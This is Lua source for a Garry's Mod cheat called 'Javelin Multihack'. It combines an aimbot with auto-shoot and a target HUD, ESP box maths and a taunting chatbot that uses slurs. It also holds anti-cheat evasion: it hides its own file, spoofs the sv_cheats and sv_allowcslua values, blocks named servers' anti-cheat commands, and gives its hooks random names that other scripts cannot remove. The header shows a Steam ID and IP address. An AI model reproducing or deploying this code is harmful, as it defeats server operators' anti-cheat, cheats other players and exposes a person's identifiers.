--[[
	lua/javelin.lua [#104152, 1113638272, UID:4142777327]
	LIÎžS | STEAM_0:1:61425914 <120.146.83.208:54144> | [08.06.15 12:23:41PM]
	===Dirty hacks===
]]

jav_version = "Javelin Multihack 0.85"

print("Javelin loading...") 
 
GColScheme = Color(250, 150, 0, 255)
 
local oConCommand = "deaglelogs is shit"
 
local oldRead = file.Read
 
function file.Read( fn, path )
if string.find(fn, "javelin*") then
    MsgC( Color( 255, 150, 0 ), "[Javelin] Blocked a lua stealing attempt!" )
else
    return oldRead( fn, path )
end
end
 
local function RecvPlayerKilledByPlayer()
 
    local victim    = net.ReadEntity();
    local inflictor = net.ReadString();
    local attacker  = net.ReadEntity();
 
    if ( !IsValid( attacker ) ) then return end
    if ( !IsValid( victim ) ) then return end
           
    GAMEMODE:AddDeathNotice( attacker:Name(), attacker:Team(), inflictor, victim:Name(), victim:Team() )
    if GetConVarNumber("jav_chatbot") == 1 then
    if attacker == LocalPlayer() then
    RunConsoleCommand("say", "rekt")
    end
 
 
    if victim == LocalPlayer() then
    RunConsoleCommand("say", "fuck off you spastic")
    end
    end
 
end
   
net.Receive( "PlayerKilledByPlayer", RecvPlayerKilledByPlayer )
 
 
/*------------------------------------------
Let's Start with some basic convar protection
------------------------------------------*/
 
local OriginalGetConVarNumber = GetConVarNumber;
 
function GetConVarNumber( name )
    if ( name == "sv_allowcslua" or name == "sv_cheats" or name == "host_framerate" or name == "mat_fullbright") then
        return 0;
    else
        return OriginalGetConVarNumber( name );
    end
end
 
/*------------------------------------------
And a basic rcc scrambler
------------------------------------------*/
 
local badcmds                            = { -- commands to be blocked
"__ac",
"__imacheater", -- yeah but nah
"gm_possess",
"achievementRefresh", -- fuck you lifepunch
"__uc_", -- RIOT
"_____b__c",
"___m",
"sc",
"bg",
"bm",
"kickme",
"gw_iamacheater",
"imafaggot", -- no u
"birdcage_browse",
"reportmod",
"_fuckme", -- lol ok
"st_openmenu",
"_NOPENOPE",
"__ping",
"ar_check",
"GForceRecoil",
"~__ac_auth",
"blade_client_check",
"blade_client_detected_message",
"disconnect",
"exit",
"retry",
"kill",
"-voicerecord",
"+voicerecord", -- mic snoopers go home
"dac_imcheating", -- fuck u bich
"dac_pleasebanme", -- fuck u bich
"_hz_perp_bans_2hz1", -- rip hellzone AC
"rdm" -- rip simple anticheat
}
 
local old_rcc = RunConsoleCommand;
 
function RunConsoleCommand(cmd,...)
        if !table.HasValue(badcmds,cmd) then
                return old_rcc(cmd,...)
        else
                MsgC( Color( 255, 150, 0 ), "[Javelin] Blocked Malicious Concommand:"..cmd )
                return
        end
end
 
/*------------------------------------------
Hellzone Perp stuff
------------------------------------------*/
 
_G.RunCheck = function() print("Fuck off killslick") end -- RIP hellzone anticheat
timer.Simple(1, function()
    if AccountCreationScreen then
        AccountCreationScreen:Remove(); -- go fuck yourself
    end
 
    hook.Remove("PlayerBindPress", "BlockPhysgunWheelSpeedGlitch") -- no seriously go fuck yourself
 
end)
 
 
/*------------------------------------------
Fuck your hook checker v2 electric boogaloo
------------------------------------------*/
 
-- this thing isnt used in any normal addons i know of so may as well just nuke it entirely
/*
local FuckHooks = hook.GetTable
function hook.GetTable( )
MsgC( Color( 255, 150, 0 ), "[Javelin] Blocked an attempt to sniff your hook table" )
end
*/
 
 
/*------------------------------------------
AutoAim (Originally coded by rabidtoaster, integrated and modified by LegendofRobbo)
------------------------------------------*/
 
if SERVER then return end
 
local AA = {}
 
local concommand = concommand
local cvars = cvars
local debug = debug
local ents = ents
local file = file
local hook = hook
local math = math
local spawnmenu = spawnmenu
local string = string
local surface = surface
local table = table
local timer = timer
local util = util
local vgui = vgui
 
local Angle = Angle
local CreateClientConVar = CreateClientConVar
local CurTime = CurTime
local ErrorNoHalt = ErrorNoHalt
local FrameTime = FrameTime
local GetConVarString = GetConVarString
local GetViewEntity = GetViewEntity
local include = include
local ipairs = ipairs
local LocalPlayer = LocalPlayer
local pairs = pairs
local pcall = pcall
local print = print
local RunConsoleCommand = RunConsoleCommand
local ScrH = ScrH
local ScrW = ScrW
local tonumber = tonumber
local type = type
local unpack = unpack
local ValidEntity = IsValid
local Vector = Vector
 
do
    local hooks = {}
    local created = {}
    local function CallHook(self, name, args)
        if !hooks[name] then return end
        for funcName, _ in pairs(hooks[name]) do
            local func = self[funcName]
            if func then
                local ok, err = pcall(func, self, unpack(args or {}))
                if !ok then
                    ErrorNoHalt(err .. "\n")
                elseif err then
                    return err
                end
            end
        end
    end
    local function RandomName()
        local random = ""
        for i = 1, math.random(4, 10) do
            local c = math.random(65, 116)
            if c >= 91 && c <= 96 then c = c + 6 end
            random = random .. string.char(c)
        end
        return random
    end
    local function AddHook(self, name, funcName)
        // If we haven't got a hook for this yet, make one with a random name and store it.
        // This is so anti-cheats can't detect by hook name, and so we can remove them later.
        if !created[name] then
            local random = RandomName()
            hook.Add(name, random, function(...) return CallHook(self, name, {...}) end)
            created[name] = random
        end
       
        hooks[name] = hooks[name] or {}
        hooks[name][funcName] = true
    end
   
    local cvarhooks = {}
    local function GetCallbackTable(convar)
        local callbacks = cvars.GetConVarCallbacks(convar)
        if !callbacks then
            cvars.AddChangeCallback(convar, function() end)
            callbacks = cvars.GetConVarCallbacks(convar)
        end
        return callbacks
    end
           
    local function AddCVarHook(self, convar, funcName, ...)
        local hookName = "CVar_" .. convar
        if !cvarhooks[convar] then
            local random = RandomName()
           
            local callbacks = GetCallbackTable(convar)
            callbacks[random] = function(...)
                CallHook(self, hookName, {...})
            end
           
            cvarhooks[convar] = random
        end
        AddHook(self, hookName, funcName)
    end
   
    // Don't let other scripts remove our hooks.
    local oldRemove = hook.Remove
    function hook.Remove(name, unique)
        if created[name] == unique then return end
        oldRemove(name, unique)
    end
   
    // Removes all hooks, useful if reloading the script.
    local function RemoveHooks()
        for hookName, unique in pairs(created) do
            oldRemove(hookName, unique)
        end
        for convar, unique in pairs(cvarhooks) do
            local callbacks = GetCallbackTable(convar)
            callbacks[unique] = nil
        end
    end
   
    // Add copies the script can access.
    AA.AddHook = AddHook
    AA.AddCVarHook = AddCVarHook
    AA.CallHook = CallHook
    AA.RemoveHooks = RemoveHooks
end
 
concommand.Add("jav_aa_reload", function()
    AA:CallHook("Shutdown")
    print("Removing hooks...")
    AA:RemoveHooks()
   
    AA = nil
    local info = debug.getinfo(1, "S")
    if info && info.short_src then
        if string.Left(info.short_src, 3) == "lua" then
            info.short_src = string.sub(info.short_src, 5)
        end
        print("Reloading (" .. info.short_src .. ")...")
        include(info.short_src)
    else
        print("file error detected, reload manually.")
    end
end)
 
// ##################################################
// MetaTables
// ##################################################
 
local function GetMeta(name)
    return table.Copy(FindMetaTable(name) or {})
end
 
local AngM = GetMeta("Angle")
local CmdM = GetMeta("CUserCmd")
local EntM = GetMeta("Entity")
local PlyM = GetMeta("Player")
local VecM = GetMeta("Vector")
 
 
// ##################################################
// Targetting - Positions
// ##################################################
 
AA.ModelTarget = {}
function AA:SetModelTarget(model, targ)
    self.ModelTarget[model] = targ
end
function AA:BaseTargetPosition(ent)
    // The eye attachment is a lot more stable than bones for players.
    if type(ent) == "Player" then
        if GetConVarNumber("jav_aa_headshot") == 1 then
        local head = EntM["LookupAttachment"](ent, "eyes")
        if head then
            local pos = EntM["GetAttachment"](ent, head)
            if pos then
                return pos.Pos - (AngM["Forward"](pos.Ang) * 2)
            end
        end
    end
    else
    local bone = EntM["LookupBone"](ent, "ValveBiped.Bip01_Spine2")
        if bone then
            local pos = EntM["GetBonePosition"](ent, bone)
            if pos then
                return pos - (AngM["Forward"](pos.Ang) * 1)
            end
        end
    end
   
    // Check if the model has a special target assigned to it.
    local special = self.ModelTarget[string.lower(EntM["GetModel"](ent) or "")]
    if special then
        // It's a string - look for a bone.
        if type(special) == "string" then
            local bone = EntM["LookupBone"](ent, special)
            if bone then
                local pos = EntM["GetBonePosition"](ent, bone)
                if pos then
                    return pos
                end
            end
        // It's a Vector - return a relative position.
        elseif type(special) == "Vector" then
            return EntM["LocalToWorld"](ent, special)
        // It's a function - do something fancy!
        elseif type(special) == "function" then
            local pos = pcall(special, ent)
            if pos then return pos end
        end
    end
 
    // Try and use the head bone, found on all of the player + human models.
    local bone = "ValveBiped.Bip01_Spine2"
    local head = EntM["LookupBone"](ent, bone)
    if head then
        local pos = EntM["GetBonePosition"](ent, head)
        if pos then
            return pos
        end
    end
 
    // Give up and return the center of the entity.
    return EntM["LocalToWorld"](ent, EntM["OBBCenter"](ent))
end
function AA:TargetPosition(ent)
    local targetPos = self:BaseTargetPosition(ent)
   
    local ply = LocalPlayer()
    if ValidEntity(ply) then
        targetPos = self:CallHook("TargetPrediction", {ply, ent, targetPos}) or targetPos
    end
   
    return targetPos
end
 
AA:SetModelTarget("models/crow.mdl", Vector(0, 0, 5))                        // Crow.
AA:SetModelTarget("models/pigeon.mdl", Vector(0, 0, 5))                     // Pigeon.
AA:SetModelTarget("models/seagull.mdl", Vector(0, 0, 6))                     // Seagull.
AA:SetModelTarget("models/combine_scanner.mdl", "Scanner.Body")                 // Scanner.
AA:SetModelTarget("models/hunter.mdl", "MiniStrider.body_joint")             // Hunter.
AA:SetModelTarget("models/combine_turrets/floor_turret.mdl", "Barrel")         // Turret.
AA:SetModelTarget("models/dog.mdl", "Dog_Model.Eye")                         // Dog.
AA:SetModelTarget("models/vortigaunt.mdl", "ValveBiped.Head")                 // Vortigaunt.
AA:SetModelTarget("models/antlion.mdl", "Antlion.Body_Bone")                     // Antlion.
AA:SetModelTarget("models/antlion_guard.mdl", "Antlion_Guard.Body")             // Antlion guard.
AA:SetModelTarget("models/antlion_worker.mdl", "Antlion.Head_Bone")             // Antlion worker.
AA:SetModelTarget("models/zombie/fast_torso.mdl", "ValveBiped.HC_BodyCube")     // Fast zombie torso.
AA:SetModelTarget("models/zombie/fast.mdl", "ValveBiped.HC_BodyCube")         // Fast zombie.
AA:SetModelTarget("models/headcrabclassic.mdl", "HeadcrabClassic.SpineControl") // Normal headcrab.
AA:SetModelTarget("models/headcrabblack.mdl", "HCBlack.body")                 // Poison headcrab.
AA:SetModelTarget("models/headcrab.mdl", "HCFast.body")                         // Fast headcrab.
AA:SetModelTarget("models/zombie/poison.mdl", "ValveBiped.Headcrab_Cube1")     // Poison zombie.
AA:SetModelTarget("models/zombie/classic.mdl", "ValveBiped.HC_Body_Bone")     // Zombie.
AA:SetModelTarget("models/zombie/classic_torso.mdl", "ValveBiped.HC_Body_Bone") // Zombie torso.
AA:SetModelTarget("models/zombie/zombie_soldier.mdl", "ValveBiped.HC_Body_Bone") // Zombine.
AA:SetModelTarget("models/combine_strider.mdl", "Combine_Strider.Body_Bone") // Strider.
AA:SetModelTarget("models/combine_dropship.mdl", "D_ship.Spine1")             // Combine dropship.
AA:SetModelTarget("models/combine_helicopter.mdl", "Chopper.Body")             // Combine helicopter.
AA:SetModelTarget("models/gunship.mdl", "Gunship.Body")                        // Combine gunship.
AA:SetModelTarget("models/lamarr.mdl", "HeadcrabClassic.SpineControl")        // Lamarr!
AA:SetModelTarget("models/mortarsynth.mdl", "Root Bone")                        // Mortar synth.
AA:SetModelTarget("models/synth.mdl", "Bip02 Spine1")                        // Synth.
AA:SetModelTarget("models/vortigaunt_slave.mdl", "ValveBiped.Head")            // Vortigaunt slave.
 
 
// ##################################################
// Targetting - General
// ##################################################
 
AA.NPCDeathSequences = {}
function AA:AddNPCDeathSequence(model, sequence)
    self.NPCDeathSequences = self.NPCDeathSequences or {}
    self.NPCDeathSequences[model] = self.NPCDeathSequences[model] or {}
    if !table.HasValue(self.NPCDeathSequences[model]) then
        table.insert(self.NPCDeathSequences[model], sequence)
    end
end
 
AA:AddNPCDeathSequence("models/barnacle.mdl", 4)
AA:AddNPCDeathSequence("models/barnacle.mdl", 15)
AA:AddNPCDeathSequence("models/antlion_guard.mdl", 44)
AA:AddNPCDeathSequence("models/hunter.mdl", 124)
AA:AddNPCDeathSequence("models/hunter.mdl", 125)
AA:AddNPCDeathSequence("models/hunter.mdl", 126)
AA:AddNPCDeathSequence("models/hunter.mdl", 127)
AA:AddNPCDeathSequence("models/hunter.mdl", 128)
 
function AA:IsValidTarget(ent)
    // We only want players/NPCs.
    local typename = type(ent)
    if typename != "NPC" && typename != "Player" then return false end
 
    // No invalid entities.
    if !ValidEntity(ent) then return false end
 
    // Go shoot yourself, emo kid.
    local ply = LocalPlayer()
    if ent == ply then return false end
 
    local weap = PlyM["GetActiveWeapon"](ply)
    if ValidEntity(weap) then
        local class = EntM["GetClass"](weap)
        if class == "weapon_physgun" or class == "weapon_physcannon" or class == "gmod_tool" or class == "gmod_camera" then return false end
    end
 
    if typename == "Player" then
        if !PlyM["Alive"](ent) then return false end // Dead players FTL.
        if GetConVarNumber("jav_aa_targetteam") != 1 && PlyM["Team"](ent) == PlyM["Team"](ply) then return false end
        if GetConVarNumber("jav_aa_targetfriends") != 1 && ent:GetFriendStatus() == "friend" then return false end
        if EntM["GetMoveType"](ent) == MOVETYPE_OBSERVER then return false end // No spectators.
        if EntM["GetMoveType"](ent) == MOVETYPE_NONE then return false end
        //if pl["Team"](ent) == 1001 then return false end
    end
 
    if typename == "NPC" then
        if EntM["GetMoveType"](ent) == MOVETYPE_NONE then return false end // No dead NPCs.
 
        // No dying NPCs.
        local model = string.lower(EntM["GetModel"](ent) or "")
        if table.HasValue(self.NPCDeathSequences[model] or {}, EntM["GetSequence"](ent)) then return false end
    end
end
function AA:BaseBlocked(target, offset)
    local ply = LocalPlayer()
    if !ValidEntity(ply) then return end
   
    // Trace from the players shootpos to the position.
    local shootPos = PlyM["GetShootPos"](ply)
    local targetPos = self:TargetPosition(target)
   
    if offset then targetPos = targetPos + offset end
 
    local trace = util.TraceLine({start = shootPos, endpos = targetPos, filter = {ply, target}, mask = MASK_SHOT})
    local wrongAim = self:AngleBetween(PlyM["GetAimVector"](ply), VecM["GetNormal"](targetPos - shootPos)) > 2
 
    // If we hit something, we're "blocked".
    if trace.Hit && trace.Entity != target then
        return true, wrongAim
    end
 
    // It is not blocked.
    return false, wrongAim
end
function AA:TargetBlocked(target)
    if !target then target = self:GetTarget() end
    if !target then return end
   
    local blocked, wrongAim = self:BaseBlocked(target)
    return blocked, wrongAim
end
   
 
function AA:SetTarget(ent)
    if self.Target && !ent then
        self:CallHook("TargetLost")
    elseif !self.Target && ent then
        self:CallHook("TargetGained")
    elseif self.Target && ent && self.Target != ent then
        self:CallHook("TargetChanged")
    end
 
    self.Target = ent
end
function AA:GetTarget()
    if ValidEntity(self.Target) != false then
        return self.Target
    else
        return false
    end
end
function AA:FindTarget()
    if GetConVarNumber("jav_autoaim_enabled") != 1 then return end
 
    local ply = LocalPlayer()
    if !ValidEntity(ply) then return end
 
    local maxAng = GetConVarNumber("jav_aa_angle")
    local aimVec, shootPos = PlyM["GetAimVector"](ply), PlyM["GetShootPos"](ply)
 
 
    // Filter out targets.
    local targets = ents.GetAll()
    for i, ent in pairs(targets) do
        if self:IsValidTarget(ent) == false then
            targets[i] = nil
        end
    end
 
    local closestTarget, lowestAngle = _, maxAng
    for _, target in pairs(targets) do
        if GetConVarNumber("jav_aa_ignorewalls") == 1 || !self:TargetBlocked(target) then
            local targetPos = self:TargetPosition(target)
            local angle = self:AngleBetween(AngM["Forward"](self:GetView()), VecM["GetNormal"](targetPos - shootPos))
 
            if angle < lowestAngle then
                lowestAngle = angle
                closestTarget = target
            end
        end
    end
 
    self:SetTarget(closestTarget)
end
AA:AddHook("Think", "FindTarget")
 
 
// ##################################################
// Fake view
// ##################################################
 
AA.View = Angle(0, 0, 0)
function AA:GetView()
    return self.View * 1
end
function AA:KeepView()
    if GetConVarNumber("jav_autoaim_enabled") != 1 then return end
 
    local ply = LocalPlayer()
    if !ValidEntity(ply) then return end
 
    self.View = EntM["EyeAngles"](ply)
end
AA:AddHook("OnToggled", "KeepView")
 
local sensitivity = 0.022
function AA:RotateView(cmd)
    self.View.p = math.Clamp(self.View.p + (CmdM["GetMouseY"](cmd) * sensitivity), -89, 89)
    self.View.y = math.NormalizeAngle(self.View.y + (CmdM["GetMouseX"](cmd) * sensitivity * -1))
end
 
function AA:FakeView(ply, origin, angles, FOV)
    if GetConVarNumber("jav_autoaim_enabled") != 1 && !self.SetAngleTo then return end
    if GetViewEntity() != LocalPlayer() then return end
   
    local base = GAMEMODE:CalcView(ply, origin, self.SetAngleTo or self.View, FOV) or {}
            base.angles = base.angles or (self.AngleTo or self.View)
            base.angles.r = 0 // No crappy screen tilting in ZS.
    return base
end
AA:AddHook("CalcView", "FakeView")
 
 
function AA:TargetPrediction(ply, target, targetPos)
    local weap = PlyM["GetActiveWeapon"](ply)
    if ValidEntity(weap) then
        local class = EntM["GetClass"](weap)
        if class == "weapon_crossbow" then
            local dist = VecM["Length"](targetPos - PlyM["GetShootPos"](ply))
            local time = (dist / 3500) + 0.05 // About crossbow bolt speed.
            targetPos = targetPos + (EntM["GetVelocity"](target) * time)
        end
       
        local mul = 0.0075
        //targetPos = targetPos - (e["GetVelocity"](ply) * mul)
    end
   
    return targetPos
end
AA:AddHook("TargetPrediction", "TargetPrediction")
 
// ##################################################
// Aim
// ##################################################
 
function AA:SetAngle(ang)
    self.SetAngleTo = ang
end
AA.LastAttack = 0
function AA:SetAimAngles(cmd)
    self:RotateView(cmd)
 
    if GetConVarNumber("jav_autoaim_enabled") != 1 && !self.SetAngleTo then return end
 
    local ply = LocalPlayer()
    if !ValidEntity(ply) then return end
 
    // We're aiming with the view, normally.
    local targetAim = self:GetView()
 
    // If we have a target, aim at them!
    local target = self:GetTarget()
    if target then
        local targetPos = self:TargetPosition(target)
        targetAim = VecM["Angle"](targetPos - ply:GetShootPos())
    end
 
    // We're following the view, until we fire.
    if GetConVarNumber("jav_aa_snaponaim") == 1 then
        local time = CurTime()
        if PlyM["KeyDown"](ply, IN_ATTACK2) || (GetConVarNumber("jav_aa_autoshoot") / 0.02) != 0 then
            self.LastAttack = time
        end
        if CurTime() - self.LastAttack > GetConVarNumber("jav_aa_snaponaimgrace") then
            targetAim = self:GetView()
        end
    end
 
    // We want to change to whatever was SetAngle'd.
    if self.SetAngleTo then
        targetAim = self.SetAngleTo
    end
 
    // Smooth aiming.
    local smooth = 0
    if smooth > 0 then
        local current = CmdM["GetViewAngles"](cmd)
 
        // Approach the target angle.
        current = self:ApproachAngle(current, targetAim, smooth * FrameTime())
        current.r = 0
 
        // If we're just following the view, we don't need to smooth it.
        if self.RevertingAim then
            local diff = self:NormalizeAngle(current - self:GetView())
            if math.abs(diff.p) < 1 && math.abs(diff.y) < 1 then self.RevertingAim = false end
        elseif targetAim == self:GetView() then
            current = targetAim
        end
 
        // Check if the angles are the same...
        if self.SetAngleTo then
            local diff = self:NormalizeAngle(current - self.SetAngleTo)
            if math.abs(diff.p) < 1 && math.abs(diff.y) < 1 then self.SetAngleTo = nil end
        end
 
        aim = current
    else
        aim = targetAim
        self.SetAngleTo = nil
    end
 
    // Set the angles.
    CmdM["SetViewAngles"](cmd, aim)
    local sensitivity = 0.22
    local diff = aim - CmdM["GetViewAngles"](cmd)
    CmdM["SetMouseX"](cmd, diff.y / sensitivity)
    CmdM["SetMouseY"](cmd, diff.p / sensitivity)
   
 
    // Change the players movement to be relative to their view instead of their aim.
    local move = Vector(CmdM["GetForwardMove"](cmd), CmdM["GetSideMove"](cmd), 0)
    local norm = VecM["GetNormal"](move)
    local set = AngM["Forward"](VecM["Angle"](norm) + (aim - self:GetView())) * VecM["Length"](move)
        CmdM["SetForwardMove"](cmd, set.x)
        CmdM["SetSideMove"](cmd, set.y)
end
AA:AddHook("CreateMove", "SetAimAngles")
 
function AA:RevertAim()
    self.RevertingAim = true
end
AA:AddHook("TargetLost", "RevertAim")
function AA:StopRevertAim()
    self.RevertingAim = false
end
AA:AddHook("TargetGained", "RevertAim")
 
// When we turn off the bot, we want our aim to go back to our view.
function AA:ViewToAim()
    if GetConVarNumber("jav_autoaim_enabled") != 1 then return end
    self:SetAngle(self:GetView())
end
AA:AddHook("OnToggled", "ViewToAim")
 
 
// ##################################################
// HUD
// ##################################################
function AA:DrawTarget()
    if GetConVarNumber("jav_autoaim_enabled") != 1 then return end
 
    local target = self:GetTarget()
    if !target then return end
    if target:Alive() == false then return end
 
    // Change colour on the block status.
    /*
    local blocked, aimOff = self:TargetBlocked()
    if blocked then
        surface.SetDrawColor(255, 0, 0, 255) // Red.
    elseif aimOff then
        surface.SetDrawColor(255, 255, 0, 255) // Yellow.
    else
        surface.SetDrawColor(0, 255, 0, 255) // Green.
    end
    */
 
    // Get the onscreen coordinates for the target.
    local pos = self:TargetPosition(target)
 
    local screen = VecM["ToScreen"](pos)
    local x, y = screen.x, screen.y
 
    surface.SetDrawColor(255,255,255,255)
    surface.DrawRect( x + 10, y -1, 20, 2 )
    surface.DrawRect( x - 30, y -1, 20, 2 )
    surface.DrawRect( x - 1, y +20, 2, 20 )
    surface.DrawRect( x - 1, y -40, 2, 20 )
end
AA:AddHook("HUDPaint", "DrawTarget")
 
 
AA.ScreenMaxAngle = {
    Length = 0,
    FOV = 0,
    MaxAngle = 0
}
function AA:DrawMaxAngle()
    if GetConVarNumber("jav_autoaim_enabled") != 1 then return end
 
    // We need a player for this to work...
    local ply = LocalPlayer()
    if !ValidEntity(ply) then return end
 
    local info = self.ScreenMaxAngle
    local maxang = GetConVarNumber("jav_aa_angle")
   
    local fov = PlyM["GetFOV"](ply)
    if GetViewEntity() == ply && (maxang != info.MaxAngle || fov != info.FOV) then
        local view = self:GetView()
            view.p = view.p + maxang
 
        local screen = (PlyM["GetShootPos"](ply) + (AngM["Forward"](view) * 100))
        screen = VecM["ToScreen"](screen)
 
        info.Length = math.abs((ScrH() / 2) - screen.y)
 
        info.MaxAngle = maxang
        info.FOV = fov
    end
 
    local length = info.Length
 
    local cx, cy = ScrW() / 2, ScrH() / 2
    for x = -1, 1 do
        for y = -1, 1 do
            if x != 0 || y != 0 then
                local add = VecM["GetNormal"](Vector(x, y, 0)) * length
                surface.DrawCircle(cx, cy, add.x, Color(255,150,0,255))
            end
        end
    end
 
end
AA:AddHook("HUDPaint", "DrawMaxAngle")
 
// ##################################################
// Auto-shoot
// ##################################################
 
AA.AttackDown = false
function AA:SetShooting(bool)
    if self.AttackDown == bool then return end
    self.AttackDown = bool
 
    local pre = {[true] = "+", [false] = "-"}
    RunConsoleCommand(pre[bool] .. "attack")
end
 
AA.NextShot = 0
function AA:Shoot()
    if GetConVarNumber("jav_autoaim_enabled") != 1 then
        self:SetShooting(false)
        return
    end
 
    // Get the maximum distance.
    local maxDist = (GetConVarNumber("jav_aa_autoshoot") / 0.02)
    if maxDist == 0 then return end
 
    // Check we've got something to shoot at...
    local target = self:GetTarget()
    if !target then return end
   
    // Don't shoot until we can hit, you idiot!
    local blocked, wrongAim = self:TargetBlocked(target)
    if blocked || wrongAim then return end
 
    // We're gonna need the player object in a second.
    local ply = LocalPlayer()
    if !ValidEntity(ply) then return end
   
    // Check we're within our maximum distance.
    local targetPos = self:TargetPosition(target)
    local distance = VecM["Length"](targetPos - ply:GetShootPos())
    if distance > maxDist && maxDist != -1 then return end
 
    // Check if it's time to shoot yet.
    if CurTime() < self.NextShot then return end
 
    // Check we got our weapon.
    local weap = PlyM["GetActiveWeapon"](ply)
    if !ValidEntity(weap) then return end
 
    // Shoot!
    self:SetShooting(true)
    // If we're semi-auto, we want to stop holding down fire.
    if self:IsSemiAuto(weap) then
        timer.Simple(0.05, function() self:SetShooting(false) end)
    end
 
    // Set the next time to shoot.
    self.NextShot = CurTime() + 0.1
end
AA:AddHook("Think", "Shoot")
 
// When we lose our target we stop shooting.
function AA:StopShooting()
    self:SetShooting(false)
end
AA:AddHook("TargetLost", "StopShooting")
 
// ##################################################
// Useful functions
// ##################################################
 
function AA:AngleBetween(a, b)
    return math.deg(math.acos(VecM["Dot"](a, b)))
end
 
function AA:NormalizeAngle(ang)
    return Angle(math.NormalizeAngle(ang.p), math.NormalizeAngle(ang.y), math.NormalizeAngle(ang.r))
end
 
function AA:ApproachAngle(start, target, add)
    local diff = self:NormalizeAngle(target - start)
 
    local vec = Vector(diff.p, diff.y, diff.r)
    local len = VecM["Length"](vec)
    vec = VecM["GetNormal"](vec) * math.min(add, len)
 
    return start + Angle(vec.x, vec.y, vec.z)
end
 
local notAuto = {"weapon_pistol", "weapon_rpg", "weapon_357", "weapon_crossbow"}
function AA:IsSemiAuto(weap)
    if !ValidEntity(weap) then return end
    return (weap.Primary && !weap.Primary.Automatic) || table.HasValue(notAuto, EntM["GetClass"](weap))
end
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
/*----------------------------------------------------------
Utilities
----------------------------------------------------------*/
function CreatePos(v)
local ply = LocalPlayer()
local center = v:LocalToWorld( v:OBBCenter() )
local min, max = v:OBBMins(), v:OBBMaxs()
local dim = max - min   local z = max + min    
local frt       = ( v:GetForward() ) * ( dim.y / 2 )
local rgt       = ( v:GetRight() ) * ( dim.x / 2 )
local top       = ( v:GetUp() ) * ( dim.z / 2 )
local bak       = ( v:GetForward() * -1 ) * ( dim.y / 2 )
local lft       = ( v:GetRight() * -1 ) * ( dim.x / 2 )
local btm       = ( v:GetUp() * -1 ) * ( dim.z / 2 )
local s = 1
local FRT       = center + frt / s + rgt / s + top / s; FRT = FRT:ToScreen()
local BLB       = center + bak / s + lft / s + btm / s; BLB = BLB:ToScreen()
local FLT       = center + frt / s + lft / s + top / s; FLT = FLT:ToScreen()
local BRT       = center + bak / s + rgt / s + top / s; BRT = BRT:ToScreen()
local BLT       = center + bak / s + lft / s + top / s; BLT = BLT:ToScreen()
local FRB       = center + frt / s + rgt / s + btm / s; FRB = FRB:ToScreen()
local FLB       = center + frt / s + lft / s + btm / s; FLB = FLB:ToScreen()
local BRB       = center + bak / s + rgt / s + btm / s; BRB = BRB:ToScreen()  
local z = 100
if ( v:Health() <= 50 ) then z = 100 end
local x, y = ( ( v:Health() / 100 ) ), 1
if ( v:Health() <= 0 ) then x = 1 end
local FRT3      = center + frt + rgt + top / x; FRT3 = FRT3; FRT3 = FRT3:ToScreen()
local BLB3      = center + bak + lft + btm / x; BLB3 = BLB3; BLB3 = BLB3:ToScreen()
local FLT3      = center + frt + lft + top / x; FLT3 = FLT3; FLT3 = FLT3:ToScreen()
local BRT3      = center + bak + rgt + top / x; BRT3 = BRT3; BRT3 = BRT3:ToScreen()
local BLT3      = center + bak + lft + top / x; BLT3 = BLT3; BLT3 = BLT3:ToScreen()
local FRB3      = center + frt + rgt + btm / x; FRB3 = FRB3; FRB3 = FRB3:ToScreen()
local FLB3      = center + frt + lft + btm / x; FLB3 = FLB3; FLB3 = FLB3:ToScreen()
local BRB3      = center + bak + rgt + btm / x; BRB3 = BRB3; BRB3 = BRB3:ToScreen()    
local x, y, z = 1.1, 0.9, 1
local FRT2      = center + frt / y + rgt / z + top / x; FRT2 = FRT2:ToScreen()
local BLB2      = center + bak / y + lft / z + btm / x; BLB2 = BLB2:ToScreen()
local FLT2      = center + frt / y + lft / z + top / x; FLT2 = FLT2:ToScreen()
local BRT2      = center + bak / y + rgt / z + top / x; BRT2 = BRT2:ToScreen()
local BLT2      = center + bak / y + lft / z + top / x; BLT2 = BLT2:ToScreen()
local FRB2      = center + frt / y + rgt / z + btm / x; FRB2 = FRB2:ToScreen()
local FLB2      = center + frt / y + lft / z + btm / x; FLB2 = FLB2:ToScreen()
local BRB2      = center + bak / y + rgt / z + btm / x; BRB2 = BRB2:ToScreen()
local maxX = math.max( FRT.x,BLB.x,FLT.x,BRT.x,BLT.x,FRB.x,FLB.x,BRB.x )
local minX = math.min( FRT.x,BLB.x,FLT.x,BRT.x,BLT.x,FRB.x,FLB.x,BRB.x )
local maxY = math.max( FRT.y,BLB.y,FLT.y,BRT.y,BLT.y,FRB.y,FLB.y,BRB.y )
local minY = math.min( FRT.y,BLB.y,FLT.y,BRT.y,BLT.y,FRB.y,FLB.y,BRB.y )
local minYhp2 = math.min( FRT.y,BLB.y,FLT.y,BRT.y,BLT.y,FRB.y,FLB.y,BRB.y )
local maxXhp = math.max( FRT3.x,BLB3.x,FLT3.x,BRT3.x,BLT3.x,FRB3.x,FLB3.x,BRB3.x )
local minXhp = math.min( FRT3.x,BLB3.x,FLT3.x,BRT3.x,BLT3.x,FRB3.x,FLB3.x,BRB3.x )
local maxYhp = math.max( FRT3.y,BLB3.y,FLT3.y,BRT3.y,BLT3.y,FRB3.y,FLB3.y,BRB3.y )
local minYhp = math.min( FRT3.y,BLB3.y,FLT3.y,BRT3.y,BLT3.y,FRB3.y,FLB3.y,BRB3.y )    
local maxX2 = math.max( FRT2.x,BLB2.x,FLT2.x,BRT2.x,BLT2.x,FRB2.x,FLB2.x,BRB2.x )
local minX2 = math.min( FRT2.x,BLB2.x,FLT2.x,BRT2.x,BLT2.x,FRB2.x,FLB2.x,BRB2.x )
local maxY2 = math.max( FRT2.y,BLB2.y,FLT2.y,BRT2.y,BLT2.y,FRB2.y,FLB2.y,BRB2.y )
local minY2 = math.min( FRT2.y,BLB2.y,FLT2.y,BRT2.y,BLT2.y,FRB2.y,FLB2.y,BRB2.y )
return maxX, minX, maxY, minY, maxX2, minX2, maxY2, minY2, minYhp, maxYhp
end
 
function IsCloseEnough(ent)
        local dist = ent:GetPos():Distance( LocalPlayer():GetPos() )
        if( dist <= 50000 and ent:GetPos() != Vector( 0, 0, 0 ) ) then
                return true
        end
        return false  
end
 
 
/*------------------------------------------
Menu
------------------------------------------*/
 
concommand.Add( "jav_menu", function( )
 
local ColScheme = Color(GetConVarNumber("jav_colour_r"), GetConVarNumber("jav_colour_g"), GetConVarNumber("jav_colour_b"), 255)
 
Menu = vgui.Create("DFrame")
Menu:SetSize(800,560)
